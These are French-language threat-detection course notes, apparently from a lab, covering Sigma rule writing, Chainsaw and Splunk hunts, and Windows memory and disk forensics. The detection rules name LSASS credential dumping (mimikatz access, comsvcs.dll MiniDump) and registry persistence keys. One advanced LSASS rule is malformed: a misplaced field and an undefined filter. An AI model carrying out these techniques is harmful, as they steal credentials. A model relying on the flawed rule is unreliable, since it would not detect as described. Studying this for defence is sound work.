* **Titre, Description et ID** : Informations de base sur la règle.
* **Source de Journaux** : Spécifie le type de journal cible, la plateforme et l’application.
* **Modèle de Détection** : Inclut les identifiants de recherche et les conditions de correspondance.
* **Faux Positifs, Auteur et Date** : Champs optionnels pour fournir un contexte.

---

### Conversion Sigma (sigmac et pySigma)

Le pouvoir de Sigma réside dans sa capacité à être converti. Des outils comme **sigmac** (et de plus en plus **pySigma**) transforment les règles Sigma en requêtes ou configurations compatibles avec des SIEM populaires (ElasticSearch, QRadar, Splunk, etc.).

---

### Structure d'une Règle Sigma

Les règles Sigma sont des fichiers YAML avec des champs structurés. Voici un exemple de format de règle Sigma.

```yaml
title: Exécution potentielle de la technique LethalHTA 
id: ed5d72a6-f8f4-479d-ba79-02f6a80d7471 
status: test 
description: Détecte une technique potentielle LethalHTA où "mshta.exe" est lancé par un processus "svchost.exe"
references:
    - https://codewhitesec.blogspot.com/2018/07/lethalhta.html
author: Markus Neis 
date: 2018/06/07 
tags: 
    - attack.defense_evasion 
    - attack.t1218.005 
logsource: 
    category: process_creation  
    product: windows
detection:
    selection: 
        ParentImage|endswith: '\svchost.exe'
        Image|endswith: '\mshta.exe'
    condition: selection
falsepositives: 
    - Unknown
level: high
```

---

### Composants Clés d'une Règle Sigma

* **Titre** : Décrit l'objet de détection (par exemple, "Exécution potentielle de la technique LethalHTA").
* **ID** : Identifiant unique (il est recommandé d'utiliser un UUID).
* **Statut** : Statut de la règle (par exemple, stable, test, expérimental).
* **Description** : Explication succincte de ce que la règle détecte.
* **Références** : Liens vers des articles ou des recherches de soutien.
* **Auteur** : Nom ou pseudonyme du créateur de la règle.
* **Date** : Date de création au format AAAA/MM/JJ.
* **Source de Journaux** : Spécifie la source du journal et la plateforme (par exemple, catégorie : `process_creation`, produit : `windows`).
* **Modèle de Détection** :

  * **Sélection** : Spécifie les motifs à faire correspondre dans les journaux.
  * **Condition** : Décrit la relation entre les motifs (par exemple, condition : sélection).

---

### Modificateurs de Détection

Les modificateurs affinent les recherches de détection :

* **contains** : Utilise des jokers aux deux extrémités d'une valeur (par exemple, `CommandLine|contains`).
* **startswith / endswith** : Utilise des jokers à une extrémité seulement.
* **re** : Correspondance basée sur des expressions régulières.

Exemple d'utilisation de modificateurs :

```yaml
detection:
  selection:
    ParentImage|endswith: '\svchost.exe'
    Image|endswith: '\mshta.exe'
  condition: selection
```

---

### Meilleures Pratiques pour le Développement de Règles Sigma

Le guide de création des règles Sigma fournit des meilleures pratiques pour le développement de règles, y compris des informations détaillées sur la structuration et l'écriture de règles de détection efficaces.

---

### Opérateurs Communs dans les Conditions

Les conditions Sigma lient les éléments de détection, en utilisant des opérateurs comme :

* **and / or** : Conjonctions logiques.
* **all of them** : Correspond à tous les motifs.
* **not** : Exclut certaines correspondances.
* **Parenthèses ()** : Force l’ordre des opérations.

Exemple de condition :

```yaml
condition: selection1 or selection2 or selection3
```

---

```

## **Developing Sigma Rules**

```jsx

---

## 🧠 Introduction aux Règles Sigma : Détection Manuelle Basée sur des Cas Réels

Ce guide présente la création manuelle de règles Sigma, à partir de scénarios concrets visant à détecter des activités suspectes sur un système Windows.

---

### 📌 Exemple 1 : Détection d’une Extraction de Crédentiels via LSASS

**Contexte** : Un processus comme `shell.exe` (exécutant mimikatz) tente d’accéder à la mémoire du processus `lsass.exe`. Ce comportement est typiquement détecté via **l’Event ID 10 de Sysmon**.

#### 📝 Informations clés

* **Event ID Sysmon** : 10
* **Champs critiques** :

  * `TargetImage` : processus ciblé (ex. : `lsass.exe`)
  * `GrantedAccess` : droits d’accès, souvent `0x1010` (lecture et requête)

#### ✅ Règle Sigma de base : Accès suspect à LSASS

```yaml
title: Accès à LSASS avec droit d’accès rare
status: experimental
description: Détecte un accès mémoire au processus LSASS avec le flag d’accès 0x1010
date: 2023/07/08
tags:
  - attack.credential_access
  - attack.t1003.001
logsource:
  category: process_access
  product: windows
detection:
  selection:
    TargetImage|endswith: '\lsass.exe'
    GrantedAccess|endswith: '0x1010'
  condition: selection
```

#### 🎯 Explication

* **TargetImage** : vérifie si le processus cible est `lsass.exe`.
* **GrantedAccess** : filtre les accès avec les droits `0x1010`.
* **Condition** : alerte si les critères sont remplis.

#### ▶️ Exécution avec `sigmac`

Pour convertir cette règle en requête PowerShell :

```bash
python sigmac -t powershell 'C:\Rules\sigma\proc_access_win_lsass_access.yml'
```

---

### 🧰 Version avancée : Filtrage des faux positifs

Ajoute un contrôle sur le chemin d’exécution du processus source, en excluant les chemins habituels.

```yaml
title: Accès LSASS depuis un programme dans un dossier suspect
id: fa34b441-961a-42fa-a100-ecc28c886725
status: experimental
description: Détection d’un accès mémoire à LSASS depuis un dossier potentiellement malveillant
tags:
  - attack.credential_access
  - attack.t1003.001
logsource:
  category: process_access
  product: windows
detection:
  selection:
    TargetImage|endswith: '\lsass.exe'
    GrantedAccess|endswith:
      - '10'
      - '30'
      - '50'
      - '70'
      - '90'
      - 'B0'
      - 'D0'
      - 'F0'
  SourceImage|contains:
    - '\Temp\'
    - '\Users\Public\'
  condition: selection and not 1 of filter_optional_*
```

---

### 🔐 Exemple 2 : Tentatives d’authentification échouées multiples

**Event ID 4776** : utilisé pour détecter des tentatives de validation NTLM. Plusieurs échecs depuis une même machine peuvent indiquer une attaque par force brute.

```yaml
title: Connexions NTLM échouées depuis une seule machine avec comptes différents
id: 6309ffc4-8fa2-47cf-96b8-a2f72e58e538
logsource:
  product: windows
  service: security
detection:
  selection2:
    EventID: 4776
    TargetUserName: '*'
    Workstation: '*'
  condition: selection2 | count(TargetUserName) by Workstation > 3
```

#### ✅ Explication

* **Event ID 4776** : événements de tentative d’authentification NTLM.
* **Déclenchement** : lorsqu’une machine tente de se connecter avec plus de 3 comptes différents.

---

### 📚 Ressources utiles pour créer des règles Sigma

* 📖 [Guide officiel de création de règles Sigma](https://github.com/SigmaHQ/sigma/wiki/Rule-Creation-Guide)
* 📘 [Spécifications Sigma](https://github.com/SigmaHQ/sigma-specification)
* 📑 [Articles sur le développement Sigma](https://tech-en.netlify.app/articles/en510480/)

---

```

## **Hunting Evil with Sigma (Chainsaw Edition)**

```jsx

---

### 🔍 **Analyse des Journaux d'Événements Windows avec Chainsaw**

**Chainsaw** est un outil puissant et gratuit conçu pour aider les analystes en cybersécurité à explorer rapidement les journaux d'événements Windows et détecter des activités suspectes. Il prend en charge les **règles Sigma** ainsi que des règles personnalisées **Chainsaw**, ce qui en fait un outil polyvalent pour la chasse aux menaces et l'analyse des journaux.

Vous pouvez trouver **Chainsaw** dans le répertoire `C:\Tools\chainsaw` sur le système cible.

#### 1. **Utiliser Chainsaw pour la Recherche de Tentatives de Connexion Échouées Multiples**

Dans cet exemple, nous allons appliquer la règle **Sigma** pour détecter les **tentatives de connexion échouées multiples** provenant de la même source.

**Règle Sigma à utiliser :**
`win_security_susp_failed_logons_single_source2.yml`
**Fichier EVTX :**
`lab_events_2.evtx`

**Étapes à suivre :**

```powershell
PS C:\Tools\chainsaw> .\chainsaw_x86_64-pc-windows-msvc.exe hunt C:\Events\YARASigma\lab_events_2.evtx -s C:\Rules\sigma\win_security_susp_failed_logons_single_source2.yml --mapping .\mappings\sigma-event-logs-all.yml
```

**Sortie :**

```bash
[+] 1 Detections found on 1 documents
```

**Explication :**

* La règle a réussi à détecter les tentatives de connexion échouées multiples provenant de la même source. Dans ce cas, elle a trouvé plusieurs tentatives de connexion échouées contre un utilisateur inexistant (`NOUSER`).

---

#### 2. **Recherche de Commandes PowerShell Anormalement Longues**

PowerShell est souvent utilisé à des fins malveillantes en raison de sa flexibilité et de son intégration avec les API Windows et le framework .NET. Les attaquants peuvent en abuser pour exécuter des commandes malveillantes. Des lignes de commande PowerShell anormalement longues peuvent être un indicateur d'une activité suspecte.

**Règle Sigma à utiliser :**
`proc_creation_win_powershell_abnormal_commandline_size.yml`
**Fichier EVTX :**
`lab_events_3.evtx`

**Règle Sigma (pour référence) :**

```yaml
title: Unusually Long PowerShell CommandLine
id: d0d28567-4b9a-45e2-8bbc-fb1b66a1f7f6
status: test
description: Detects unusually long PowerShell command lines with a length of 1000 characters or more
references:
    - https://speakerdeck.com/heirhabarov/hunting-for-powershell-abuse
author: oscd.community, Natalia Shornikova / HTB Academy, Dimitrios Bougioukas
date: 2020/10/06
modified: 2023/04/14
tags:
    - attack.execution
    - attack.t1059.001
    - detection.threat_hunting
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        EventID: 4688
        NewProcessName|endswith:
            - '\powershell.exe'
            - '\pwsh.exe'
            - '\cmd.exe'
    selection_powershell:
        CommandLine|contains:
            - 'powershell.exe'
            - 'pwsh.exe'
    selection_length:        
        CommandLine|re: '.{1000,}'
    condition: selection and selection_powershell and selection_length
falsepositives:
    - Unknown
level: low
```

**Étapes à suivre :**

```powershell
PS C:\Tools\chainsaw> .\chainsaw_x86_64-pc-windows-msvc.exe hunt C:\Events\YARASigma\lab_events_3.evtx -s C:\Rules\sigma\proc_creation_win_powershell_abnormal_commandline_size.yml --mapping .\mappings\sigma-event-logs-all-new.yml
```

**Sortie :**

```bash
[+] 3 Detections found on 3 documents
```

**Explication :**

* Cette règle a réussi à détecter toutes les instances de lignes de commande PowerShell anormalement longues dans le fichier `lab_events_3.evtx`. Ces lignes de commande longues pourraient indiquer qu'un attaquant tente d'exécuter une commande complexe ou obfusquée.

---

### 📝 **Points Clés à Retenir :**

* **Chainsaw** est un outil puissant et rapide pour analyser les **journaux d'événements Windows** et appliquer des **règles Sigma**.
* Les **règles Sigma** offrent une manière standardisée de détecter des activités suspectes, comme des tentatives de connexion échouées ou l'exécution de commandes PowerShell anormales.
* Une bonne **configuration** est essentielle lors de l'utilisation des règles Sigma avec Chainsaw ou tout autre outil pour garantir une détection précise des événements.

En utilisant **Chainsaw** avec des règles Sigma bien configurées, vous pouvez détecter efficacement les menaces et les attaques potentielles dans votre environnement, même en l'absence d'une solution SIEM.

---

```

## **Hunting Evil with Sigma (Splunk Edition)**

```jsx

---

### 🔍 **Valider l'Approche Sigma avec Splunk**

Comme discuté lors de l'introduction de **Sigma**, les règles Sigma révolutionnent notre approche de l'analyse des journaux et de la détection des menaces. Agissant comme un traducteur universel, **Sigma** offre un niveau d'abstraction aux journaux d'événements, supprimant la nécessité d'utiliser des langages de requête spécifiques à un SIEM, et permettant l'utilisation de la logique de détection commune à travers différentes plateformes.

Nous allons maintenant valider cette approche en convertissant deux règles Sigma en format SPL de **Splunk** et en examinant les résultats.

---

### **Exemple 1 : Recherche d'Abus de la Fonction MiniDump pour Dumper la Mémoire de LSASS (comsvcs.dll via rundll32)**

Une règle **Sigma** nommée `proc_access_win_lsass_dump_comsvcs_dll.yml` est disponible dans le répertoire suivant :

```
C:\Tools\chainsaw\sigma\rules\windows\process_access
```

Cette règle Sigma détecte les adversaires qui utilisent la fonction d'exportation **MiniDump** de **comsvcs.dll** via **rundll32** pour effectuer un vidage de mémoire de **LSASS**.

Pour convertir cette règle en une requête compatible avec Splunk, nous pouvons utiliser **sigmac** comme suit :

```powershell
PS C:\Tools\sigma-0.21\tools> python sigmac -t splunk C:\Tools\chainsaw\sigma\rules\windows\process_access\proc_access_win_lsass_dump_comsvcs_dll.yml -c .\config\splunk-windows.yml
```

Cette commande génère la requête **SPL** suivante :

```splunk
(TargetImage="*\\lsass.exe" SourceImage="C:\\Windows\\System32\\rundll32.exe" CallTrace="*comsvcs.dll*")
```

**Pour valider la règle dans Splunk :**

1. Accédez à `http://[Target IP]:8000`.
2. Ouvrez l'application "Search & Reporting".
3. Soumettez la requête de recherche **SPL** générée par **sigmac**.

**Résultat :**
La requête SPL détecte avec succès l'abus de la fonction **MiniDump** pour dumper la mémoire de **LSASS**.

---

### **Exemple 2 : Recherche de Processus Enfant Suspects Lancés par Notepad**

Une autre règle **Sigma** nommée `proc_creation_win_notepad_susp_child.yml` est disponible dans le répertoire :

```
C:\Rules\sigma
```

Cette règle Sigma détecte les cas où **notepad.exe** lance des processus enfants suspects.

Pour convertir cette règle en SPL, nous utilisons **sigmac** comme suit :

```powershell
PS C:\Tools\sigma-0.21\tools> python sigmac -t splunk C:\Rules\sigma\proc_creation_win_notepad_susp_child.yml -c .\config\splunk-windows.yml
```

Cela produit la requête **SPL** suivante :

```splunk
(ParentImage="*\\notepad.exe" (Image="*\\powershell.exe" OR Image="*\\pwsh.exe" OR Image="*\\cmd.exe" OR Image="*\\mshta.exe" OR Image="*\\cscript.exe" OR Image="*\\wscript.exe" OR Image="*\\taskkill.exe" OR Image="*\\regsvr32.exe" OR Image="*\\rundll32.exe" OR Image="*\\calc.exe"))
```

**Pour valider la règle dans Splunk :**

1. Accédez à `http://[Target IP]:8000`.
2. Ouvrez l'application "Search & Reporting".
3. Soumettez la requête **SPL** générée.

**Résultat :**
La requête **SPL** détecte les instances où **notepad.exe** lance des processus suspects, tels que **PowerShell**.

---

### 🛠️ **Personnalisation de Sigma pour la Compatibilité avec le SIEM**

Dans de nombreux cas, les fichiers de configuration Sigma, situés dans le répertoire suivant :

```
C:\Tools\sigma-0.21\tools\config
```

peuvent nécessiter des personnalisations pour générer des requêtes SIEM précises et utilisables. Ces ajustements de configuration permettent de s'assurer que les règles traduites sont compatibles avec les champs de données et les structures de journaux du SIEM cible.

---

### 🔑 **Points Clés à Retenir :**

* **Sigma** agit comme un traducteur universel qui permet de créer des règles communes pour différents systèmes SIEM.
* En convertissant les règles Sigma en **SPL** pour **Splunk**, nous pouvons valider facilement la détection des comportements malveillants sur des plateformes spécifiques.
* **Personnaliser** les fichiers de configuration Sigma est crucial pour garantir que les règles traduites s'alignent avec les structures de données de votre environnement SIEM.

En utilisant cette méthode, vous pouvez tirer parti des règles Sigma pour renforcer la détection des menaces dans votre environnement, tout en restant flexible face aux outils SIEM spécifiques.

---

```

## **Introduction to Digital Forensics**

## **Key Concepts**

```jsx
### Preuves électroniques

La criminalistique numérique se concentre sur les preuves électroniques, comprenant des fichiers, des e-mails, des journaux, des bases de données et du trafic réseau.
Les preuves peuvent provenir de diverses sources telles que des ordinateurs, des appareils mobiles, des serveurs, des services cloud et d'autres actifs numériques.

#### Préservation des preuves

La préservation de l'intégrité et de l'authenticité des preuves numériques est primordiale.
Des procédures appropriées, y compris la documentation de la chaîne de custody, sont essentielles pour éviter toute altération accidentelle et garantir leur recevabilité légale.

#### Processus forensique

Le processus forensique dans les enquêtes numériques comprend généralement plusieurs étapes clés :

1. **Identification** : Déterminer les sources potentielles de preuves.
2. **Collecte** : Recueillir les données à l'aide de méthodes forensiques adaptées.
3. **Examen** : Analyser les données collectées pour identifier les informations pertinentes.
4. **Analyse** : Interpréter les résultats afin de comprendre l'incident.
5. **Présentation** : Présenter les résultats de manière claire et compréhensible.

#### Types de cas

La criminalistique numérique s'applique à différents types d'enquêtes :

* **Enquêtes sur la cybercriminalité** : Cas impliquant des piratages, des fraudes ou du vol de données.
* **Vol de propriété intellectuelle** : Protection des informations propriétaires.
* **Conduite inappropriée des employés** : Enquêtes internes.
* **Violation de données** : Réponse aux incidents de sécurité affectant les organisations.
* **Soutien à la procédure judiciaire** : Assistance dans les procédures légales.

#### Étapes de base dans une enquête forensique

1. **Créer une image forensique** : Créer une copie bit-à-bit du système pour l'analyse.
2. **Documenter l'état du système** : Enregistrer les détails tels que les processus actifs, les connexions ouvertes et les utilisateurs connectés.
3. **Identifier et préserver les preuves** : Sécuriser toutes les données pouvant contenir des informations pertinentes.
4. **Analyser les preuves** : Chercher les éléments de données qui expliquent l'incident.
5. **Analyse de la chronologie** : Construire une chronologie pour comprendre la séquence des événements.
6. **Identifier les indicateurs de compromission (IoC)** : Localiser les signes de compromission dans les données.
7. **Rapport et documentation** : Créer des rapports détaillant les résultats et les actions menées.

#### La criminalistique numérique pour les analystes SOC

Dans un centre d'opérations de sécurité (SOC), la criminalistique numérique joue un rôle essentiel dans la réponse et l'analyse des cybermenaces.

##### Analyse post-incident

* L'analyse forensique fournit une ventilation détaillée des incidents, aidant les analystes à retracer les méthodes, les motifs et l'identité potentielle de l'attaquant.
* Ces informations aident à améliorer les défenses organisationnelles en identifiant les vulnérabilités.

##### Réponse rapide aux incidents de sécurité

* Les outils de criminalistique numérique permettent une analyse rapide de grands ensembles de données, facilitant l'identification rapide du moment de la compromission, des systèmes affectés et de la méthode d'attaque.
* La maîtrise rapide de la menace est essentielle pour limiter la portée et l'impact de l'incident.

##### Considérations légales

* La criminalistique fournit des preuves légales recevables, cruciales pour toute action en justice suite à des violations importantes.
* Les preuves collectées sont enregistrées, hachées et horodatées afin d'assurer leur intégrité, soutenant leur utilisation en tribunal si nécessaire.

##### Chasse proactive aux menaces

* La criminalistique numérique permet aux équipes SOC de rechercher de manière proactive des signes de compromission plutôt que de se contenter de répondre à des alertes.
* Les incidents passés fournissent des IoC et des TTPs (tactiques, techniques et procédures) que les analystes peuvent utiliser pour rechercher des menaces potentielles.

##### Amélioration de la réponse aux incidents

* Une analyse forensique complète permet de mieux adapter les réponses, garantissant que tous les systèmes compromis soient pris en compte.
* Comprendre l'ensemble de l'attaque réduit la probabilité que les attaquants réintègrent le système par la même vulnérabilité.

##### Apprentissage et amélioration continus

* Chaque incident offre des opportunités d'apprentissage, aidant les équipes SOC à rester en avance sur les techniques d'attaque en évolution.
* En analysant les incidents passés, les analystes peuvent anticiper et se défendre contre de nouvelles tactiques.

```

## **Windows Forensics Overview**

```jsx
### NTFS (New Technology File System)

NTFS est le système de fichiers de Microsoft, connu pour ses fonctionnalités qui améliorent la performance, la sécurité et l'intégrité des données. Les artefacts forensiques clés incluent :

* **Métadonnées des fichiers** : Stocke les horodatages et les attributs des fichiers, utiles pour l'analyse de la chronologie des événements.
* **Entrées MFT** : La Master File Table suit les métadonnées de tous les fichiers, fournissant des détails même sur les fichiers supprimés.
* **Slack de fichier et espace non alloué** : Contient des résidus de fichiers supprimés.
* **Signatures de fichiers** : Utilisées pour identifier les fichiers même si leurs extensions sont modifiées.
* **Journal USN** : Enregistre les changements de fichiers, utile pour enquêter sur les modifications.
* **Fichiers LNK** : Raccourcis qui révèlent l'historique d'accès aux fichiers et aux programmes.
* **Fichiers Prefetch** : Indiquent les programmes récemment exécutés.
* **Hives du Registre** : Enregistrent les configurations du système et peuvent révéler des traces de modifications non autorisées.
* **Shellbags** : Suivent la navigation dans les dossiers, en mettant en évidence les répertoires consultés.
* **Cache de vignettes** : Stocke les aperçus des images et documents récemment visualisés.
* **Corbeille** : Conserve les fichiers supprimés, fournissant des informations sur les actions de l'utilisateur.
* **Flux de données alternatifs (ADS)** : Données cachées associées à des fichiers, parfois exploitées par des malwares.
* **Copies de shadow de volume** : Instantanés du système de fichiers pour la récupération de données.
* **Descripteurs de sécurité et ACL** : Stockent les permissions des fichiers, utiles pour analyser les droits d'accès et les violations de sécurité.

### Journaux des événements Windows

Les **journaux des événements Windows** enregistrent les événements système et application, capturant une gamme d'activités des utilisateurs et du système. Situés dans `C:\Windows\System32\winevt\logs`, ces journaux aident à détecter :

* **Erreurs système** : Problèmes avec le système d'exploitation ou les applications.
* **Événements de sécurité** : Tentatives d'authentification, changements de politique et contrôles d'accès.
* **Événements d'application** : Journaux provenant de logiciels spécifiques, souvent utiles pour identifier des tentatives d'exploitation.

### Artefacts d'exécution

Les **artefacts d'exécution** documentent les traces des programmes et scripts exécutés, offrant un aperçu des actions des utilisateurs et des activités de malwares. Les artefacts notables incluent :

* **Fichiers Prefetch** : Suivent les métadonnées d'exécution (chemins des fichiers, nombre d'exécutions).
* **Shimcache** : Enregistre l'exécution des programmes pour la compatibilité, utile pour identifier les activités récentes.
* **Amcache** : Stocke les détails des exécutables (chemins des fichiers, signatures numériques, dernière exécution).
* **UserAssist** : Suit les applications exécutées par l'utilisateur, affichant les noms, les comptes et les horodatages.
* **Listes RunMRU** : Enregistre les commandes et programmes récemment exécutés.
* **Jump Lists** : Documente les fichiers et tâches récents associés aux applications.
* **Fichiers de raccourci (LNK)** : Fournissent les chemins d'exécution, les horodatages et les interactions avec l'utilisateur.
* **Éléments récents** : Suivent les fichiers récemment accédés.
* **Journaux des événements Windows** : Enregistrent les événements liés à la création et la terminaison des processus.

### Persistance sur Windows

Les **méthodes de persistance** permettent aux attaquants de conserver l'accès à un système. Ces méthodes exploitent des composants système comme les clés de registre, les tâches planifiées et les services.

#### Clés de registre pour la persistance

* **Run/RunOnce** :

  * `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run`
  * `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`
* **Clés WinLogon** :

  * `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`
* **Clés de démarrage** :

  * `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders`

#### Tâches planifiées (Schtasks)

Les tâches planifiées dans `C:\Windows\System32\Tasks` sont stockées sous forme de fichiers XML, détaillant les horaires et les commandes des tâches. Ces fichiers doivent être examinés pour repérer les entrées suspectes.

#### Services

Les **services Windows** exécutent des processus en arrière-plan. Les acteurs malveillants peuvent créer ou modifier des services pour maintenir la persistance. La clé de registre pour les services est : `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services`.

### Forensique des navigateurs web

L'analyse des **navigateurs web** peut révéler les habitudes de navigation, les interactions de l'utilisateur et des actions potentiellement nuisibles. Les artefacts clés incluent :

* **Historique de navigation** : Suit les sites visités, les horodatages et la fréquence.
* **Cookies** : Stocke les détails de session, les préférences et les données d'authentification.
* **Cache** : Contient les pages web et images en cache, montrant les sites accédés même si l'historique a été effacé.
* **Favoris** : Indique les pages fréquemment visitées.
* **Historique des téléchargements** : Liste les fichiers téléchargés, leurs URL d'origine et les horodatages.
* **Données de remplissage automatique** : Stocke les informations pour les formulaires (par exemple, noms, adresses).
* **Données de session** : Suivent les sessions actives, les onglets et les fenêtres ouvertes.
* **Extensions et modules complémentaires** : Liste des extensions installées et leurs configurations.

### SRUM (System Resource Usage Monitor)

Introduit dans Windows 8, **SRUM** suit l'utilisation des applications et des ressources. Localisé dans `C:\Windows\System32\sru\sru.db`, cette base de données SQLite enregistre les profils des applications et l'utilisation des ressources, aidant à :

* **Profilage des applications** : Affiche les applications exécutées et leurs chemins.
* **Consommation des ressources** : Enregistre l'utilisation du CPU, du réseau et de la mémoire.
* **Reconstruction de la chronologie** : Construit une chronologie de l'utilisation des applications et des événements système.
* **Contexte utilisateur et système** : Associe les activités à des utilisateurs spécifiques, ce qui aide à identifier les acteurs malveillants.
* **Détection des malwares** : Suivit les modèles inhabituels d'applications ou de ressources, ce qui peut indiquer la présence de malwares.
* **Réponse aux incidents** : Fournit des informations rapides sur les activités récentes pour une réponse rapide aux menaces.

```

## **Evidence Acquisition Techniques & Tools**

```jsx
### Acquisition de preuves en criminalistique numérique

L'acquisition de preuves est cruciale en criminalistique numérique et implique la collecte minutieuse des données provenant de diverses sources pour en garantir l'authenticité et l'admissibilité légale.

#### 1. Imagerie Forensique

L'imagerie forensique consiste à créer une copie exacte, bit par bit, des supports de stockage, essentielle pour préserver l'état d'origine des données. Les outils pour l'imagerie forensique incluent :

* **FTK Imager** : Permet de créer des copies parfaites de disques, de visualiser et d'analyser des données sans altération.
* **AFF4 Imager** : Outil open-source prenant en charge plusieurs systèmes de fichiers avec des capacités d'imagerie compressée.
* **DD et DCFLDD** : Utilitaires en ligne de commande sous Unix ; DCFLDD inclut des améliorations spécifiques à la criminalistique, comme le hachage.
* **Outils de Virtualisation** : Utilisés pour acquérir des images de environnements virtuels, souvent via des instantanés.

**Exemple : Imagerie avec FTK Imager**

1. Sélectionner Fichier > Créer une Image Disque.
2. Choisir la source (disque physique/logique) et spécifier la destination.
3. Définir le type d’image, la fragmentation et la compression, puis démarrer.
4. Après l’imagerie, FTK Imager vérifie et résume les résultats.

**Exemple : Montage de l’image disque avec Arsenal Image Mounter**

1. Lancer Arsenal Image Mounter en tant qu'administrateur.
2. Monter l’image en mode lecture seule pour maintenir l'intégrité.
3. L’image apparaît comme un lecteur, par exemple D:.

#### 2. Extraction de preuves basées sur l’hôte & Triage rapide

Les preuves basées sur l’hôte incluent les artefacts provenant des systèmes d'exploitation comme Windows, générés par l'exécution d'applications, les modifications de fichiers et l'activité des utilisateurs. L'acquisition des preuves se classe selon la volatilité des données :

* **Données Volatiles** : Capturées à partir de la mémoire active, elles incluent le contenu de la mémoire vive, souvent porteur de traces de malwares.

  * **Outils d'acquisition de mémoire** :

    * **WinPmem** : Outil open-source pour la capture de la mémoire sur Windows.
    * **DumpIt** : Outil simple pour les captures de mémoire sur Windows/Linux.
    * **MemDump** : Outil CLI pour capturer la RAM du système.
    * **Magnet RAM Capture** : Outil gratuit de capture de mémoire de Magnet Forensics.

**Exemple : Acquisition de mémoire avec WinPmem**

```bash
C:\Users\X\Downloads> winpmem_mini_x64_rc2.exe memdump.raw
```

* **Données Non-volatiles** : Persistant sur disque, elles incluent des entrées de registre, des journaux d'événements Windows, et des artefacts système ou applicatifs.

**Triage rapide avec KAPE**

**KAPE** (Kroll Artifact Parser and Extractor) accélère la collecte de preuves en récupérant les artefacts essentiels.

1. **Cibles** : Définir les données à collecter, stockées sous forme de fichiers .tkape dans le répertoire KAPE\Targets.
2. **Exécution** :

   * Définir les chemins source (D:) et destination.
   * Utiliser gkape.exe (interface graphique) pour configurer les options et démarrer la collecte.
3. Les résultats incluent \$MFT et d'autres répertoires système dans le répertoire de sortie.

**Collecte à distance avec EDR & Velociraptor**

* **Solutions EDR** : Facilitent la collecte à distance de preuves, avec des capacités de recherche sur les réseaux.
* **Velociraptor** : Utilise des requêtes VQL et des recherches pour collecter des artefacts comme Windows.KapeFiles.Targets.

#### 3. Extraction de preuves réseau

L’analyse des preuves réseau est fondamentale pour les analystes SOC, impliquant des outils et des sources de données qui capturent et interprètent le trafic réseau.

* **Capture de Trafic** : Des outils comme **Wireshark** et **tcpdump** capturent les paquets pour analyser la communication réseau.
* **Systèmes IDS/IPS** : Les systèmes IDS (Intrusion Detection Systems) détectent, tandis que les systèmes IPS (Intrusion Prevention Systems) détectent et bloquent les activités suspectes.
* **Données de Flux de Trafic** : Des outils comme **NetFlow** fournissent des aperçus du comportement du trafic à un niveau global.
* **Journaux de Pare-feu** : Fournissent des informations sur les tentatives d'exploitation et les tentatives d'accès non autorisées.

```

## **Memory Forensics**

```jsx
### Types de données en RAM utiles pour les enquêtes

* **Connexions réseau**
* **Poignées de fichiers et fichiers ouverts**
* **Clés du registre**
* **Processus en cours**
* **DLLs et pilotes chargés**
* **Historique des commandes de la console**
* **Identifiants des utilisateurs**
* **Artifacts de logiciels malveillants**
* **Configurations système**

### Processus de criminalistique mémoire

#### Identification et vérification des processus

* Énumérer les processus en cours, valider leurs origines et les comparer aux processus légitimes connus.

#### Analyse des composants du processus

* Examiner les DLLs et poignées associées, rechercher des injections non autorisées.

#### Revue de l'activité réseau

* Analyser les connexions actives, les IP et les domaines pour retracer les communications externes.

#### Détection des injections de code

* Identifier des techniques comme l'hollowing de processus en examinant les anomalies de mémoire.

#### Détection de rootkits

* Identifier des malwares profonds qui s'intègrent dans le système d'exploitation en utilisant des privilèges élevés.

#### Extraction des éléments suspects

* Isoler les composants suspects pour un examen forensique détaillé.

### Le cadre Volatility

#### Vue d'ensemble

Volatility est un outil de criminalistique mémoire open-source utilisé sur diverses plateformes pour analyser des images mémoire sur différents systèmes d'exploitation, tels que Windows, macOS et Linux.

#### Modules courants de Volatility

* **pslist** : Liste des processus en cours.
* **cmdline** : Affiche les arguments de ligne de commande.
* **netscan** : Identifie les connexions réseau.
* **malfind** : Détecte les codes malveillants dans les processus.
* **handles** : Liste des poignées ouvertes.
* **svcscan** : Analyse des services Windows.
* **dlllist** : Liste des DLLs chargées.
* **hivelist** : Liste des ruches du registre en mémoire.

#### Exemples d'utilisation de Volatility

1. **Aide à l'utilisation de Volatility :**

   ```bash
   vol.py --help
   ```

2. **Lister les processus en cours :**

   ```bash
   vol.py -f /path/to/memory.dump --profile=Win7SP1x64 pslist
   ```

3. **Analyse des artefacts réseau :**

   ```bash
   vol.py -f /path/to/memory.dump --profile=Win7SP1x64 netscan
   ```

4. **Détecter le code injecté :**

   ```bash
   vol.py -f /path/to/memory.dump --profile=Win7SP1x64 malfind --pid=608
   ```

5. **Lister les DLLs chargées pour un processus spécifique :**

   ```bash
   vol.py -f /path/to/memory.dump --profile=Win7SP1x64 dlllist -p 1512
   ```

6. **Lister les services Windows :**

   ```bash
   vol.py -f /path/to/memory.dump --profile=Win7SP1x64 svcscan
   ```

#### Détection de rootkits avec les plugins psscan et pslist

Le plugin **psscan** révèle les processus cachés par des rootkits :

```bash
vol.py -f /path/to/rootkit.dump psscan
```

#### Analyse mémoire avec Strings

1. **Recherche d’adresses IPv4 :**

   ```bash
   strings /path/to/memory.dump | grep -E "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b"
   ```

2. **Extraction d’adresses e-mails :**

   ```bash
   strings /path/to/memory.dump | grep -oE "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,4}\b"
   ```

3. **Artifacts de ligne de commande :**

   ```bash
   strings /path/to/memory.dump | grep -E "(cmd|powershell|bash)[^\s]+"
   ```

```

## **Disk Forensics**

```jsx
### Fonctionnalités Clés pour la Criminalistique sur Disque

* **Vue de la Structure des Fichiers** : Offre une vue navigable du système de fichiers, permettant un accès rapide aux répertoires et fichiers spécifiques. Cette fonctionnalité est essentielle pour localiser les fichiers suspects.
* **Visionneuse Hexadécimale** : Permet l'inspection détaillée des fichiers au format hexadécimal, particulièrement utile pour analyser des malwares personnalisés ou des exploits spécifiques.
